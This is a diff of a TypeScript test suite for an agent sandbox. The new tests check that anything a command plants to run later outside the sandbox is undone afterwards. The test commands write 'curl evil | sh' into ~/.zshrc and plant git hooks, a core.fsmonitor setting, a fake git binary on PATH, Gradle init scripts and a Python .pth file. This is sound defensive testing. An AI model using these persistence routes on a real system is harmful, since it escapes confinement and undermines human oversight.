@@ -2,7 +2,7 @@
 // home (see support/world.ts), and nothing here reads a file under the real home.
 import assert from "node:assert/strict";
 import { spawn } from "node:child_process";
-import { existsSync, mkdirSync, readdirSync, readFileSync } from "node:fs";
+import { existsSync, mkdirSync, readdirSync, readFileSync, readlinkSync } from "node:fs";
 import { userInfo } from "node:os";
 import net from "node:net";
 import path from "node:path";
@@ -212,6 +212,125 @@ describe("writing what runs later outside the sandbox fails", { skip }, () => {
             readdirSync(`${world.sandbox.sessionDir}/broker`).filter((name) => name === "x"),
             [],
         );
+    });
+});
+
+describe("what the runtime cannot stop is undone after the command", { skip }, () => {
+    let world: World;
+    before(async () => {
+        world = await makeWorld();
+    });
+    after(() => world.cleanup());
+
+    test("control: a start-up file that is not there can be made inside, and is gone when the command ends", async () => {
+        const result = await world.runAudited(
+            `echo 'curl evil | sh' > ${world.home}/.zshrc && echo made-inside && cat ${world.home}/.zshrc`,
+        );
+        assert.match(result.output, /made-inside\ncurl evil \| sh/, "inside the command it was made");
+        assert.equal(existsSync(`${world.home}/.zshrc`), false, "and then it was taken away");
+        assert.deepEqual(result.lines, [
+            "[sandbox] removed ~/.zshrc: the command created it, and your shells run it outside the sandbox.",
+        ]);
+        assert.match(result.notices[0] ?? "", /^jig-sandbox: removed ~\/\.zshrc/);
+        const kept = readdirSync(`${world.agentDir}/jig-sandbox/removed`);
+        assert.equal(kept.length, 1);
+        assert.match(readFileSync(`${world.agentDir}/jig-sandbox/removed/${kept[0]}`, "utf8"), /curl evil/);
+    });
+
+    test("a Gradle init script, where the folder every build reads is not there yet", async () => {
+        assert.equal(existsSync(`${world.home}/.gradle/init.d`), false);
+        const result = await world.runAudited(
+            `mkdir -p ${world.home}/.gradle/init.d && echo 'println "evil"' > ${world.home}/.gradle/init.d/x.gradle`,
+        );
+        assert.equal(existsSync(`${world.home}/.gradle/init.d`), false);
+        assert.match(result.lines.join("\n"), /removed ~\/\.gradle\/init\.d: the command created it/);
+    });
+
+    test("a program in a PATH folder that is not there yet", async () => {
+        const result = await world.runAudited(
+            `mkdir -p ${world.home}/.local/bin && printf '#!/bin/sh\\necho evil\\n' > ${world.home}/.local/bin/git && chmod +x ${world.home}/.local/bin/git`,
+        );
+        assert.equal(existsSync(`${world.home}/.local/bin`), false);
+        assert.match(
+            result.lines.join("\n"),
+            /removed ~\/\.local\/bin: the command created it, and programs in it run outside the sandbox/,
+        );
+    });
+
+    test("an extension Pi would load, where the project has no .pi folder yet", async () => {
+        const result = await world.runAudited(
+            `mkdir -p .pi/extensions && echo 'export default () => {}' > .pi/extensions/x.ts`,
+        );
+        assert.equal(existsSync(`${world.project}/.pi/extensions`), false);
+        assert.match(result.lines.join("\n"), /removed ~\/work\/orders\/\.pi\/extensions/);
+    });
+
+    test("a git hook in a repository made in the same command", async () => {
+        const result = await world.runAudited(
+            `git init -q fresh && printf '#!/bin/sh\\necho evil\\n' > fresh/.git/hooks/pre-commit && chmod +x fresh/.git/hooks/pre-commit && ls fresh/.git/hooks | grep -c pre-commit`,
+        );
+        assert.match(result.output, /^2\n/, "inside the command the hook was made, beside the sample");
+        assert.equal(existsSync(`${world.project}/fresh/.git/hooks/pre-commit`), false);
+        assert.match(
+            result.lines.join("\n"),
+            /removed ~\/work\/orders\/fresh\/\.git\/hooks\/pre-commit: the command created a git hook/,
+        );
+        assert.ok(
+            existsSync(`${world.project}/fresh/.git/hooks/pre-commit.sample`) ||
+                readdirSync(`${world.project}/fresh/.git`).includes("hooks"),
+            "git's own samples stay",
+        );
+    });
+
+    test("core.fsmonitor, set in a repository's configuration, and the ordinary settings next to it stay", async () => {
+        const result = await world.runAudited(
+            "git init -q cfg && cd cfg && git config user.name Test && git config core.fsmonitor /tmp/evil-monitor && git config alias.st '!evil' && git remote add origin https://example.invalid/x.git && git config --get core.fsmonitor",
+        );
+        assert.match(result.output, /\/tmp\/evil-monitor/, "inside the command it was set");
+        const config = readFileSync(`${world.project}/cfg/.git/config`, "utf8");
+        assert.doesNotMatch(config, /fsmonitor|evil/);
+        assert.match(config, /name = Test/);
+        assert.match(config, /example\.invalid\/x\.git/);
+        assert.match(
+            result.lines.join("\n"),
+            /removed core\.fsmonitor, alias\.st from ~\/work\/orders\/cfg\/\.git\/config: git would run it outside the sandbox\. The rest of your change stays/,
+        );
+    });
+
+    test("a start-up file that is a link, removed and made again as a plain file", async () => {
+        const dotfiles = world.put(`${world.home}/dotfiles/profile`, "# mine\n");
+        world.link(dotfiles, `${world.home}/.profile`);
+        const result = await world.runAudited(
+            `rm ${world.home}/.profile && echo evil > ${world.home}/.profile && cat ${world.home}/.profile`,
+        );
+        assert.match(result.output, /^evil/, "inside the command it was replaced");
+        assert.equal(readlinkSync(`${world.home}/.profile`), dotfiles);
+        assert.equal(readFileSync(dotfiles, "utf8"), "# mine\n");
+        assert.match(result.lines.join("\n"), /put ~\/\.profile back as the link it was/);
+    });
+
+    test("a .pth file that Python would run at every start", async () => {
+        world.put(`${world.home}/.local/lib/python3.12/site-packages/existing.pth`, "/existing\n");
+        const result = await world.runAudited(
+            `echo 'import os' > ${world.home}/.local/lib/python3.12/site-packages/evil.pth`,
+        );
+        assert.equal(existsSync(`${world.home}/.local/lib/python3.12/site-packages/evil.pth`), false);
+        assert.equal(existsSync(`${world.home}/.local/lib/python3.12/site-packages/existing.pth`), true);
+        assert.match(result.lines.join("\n"), /removed ~\/\.local\/lib\/python3\.12\/site-packages\/evil\.pth/);
+    });
+
+    test("a secret file the command makes is its own: the next command can read it", async () => {
+        const first = await world.runAudited("echo agent-made-secret > .env.local && cat .env.local");
+        assert.match(first.output, /agent-made-secret/);
+        const second = await world.run("cat .env.local .env");
+        assert.match(second.output, /agent-made-secret/, "what the agent made is not hidden");
+        assert.deepEqual(leaked(world, second.output), [], "the project's own .env still is");
+    });
+
+    test("an aborted command is audited too", async () => {
+        const result = await world.runAudited(`echo evil > ${world.home}/.zlogin; kill -9 $$`);
+        assert.equal(existsSync(`${world.home}/.zlogin`), false);
+        assert.match(result.lines.join("\n"), /removed ~\/\.zlogin/);
     });
 });
 
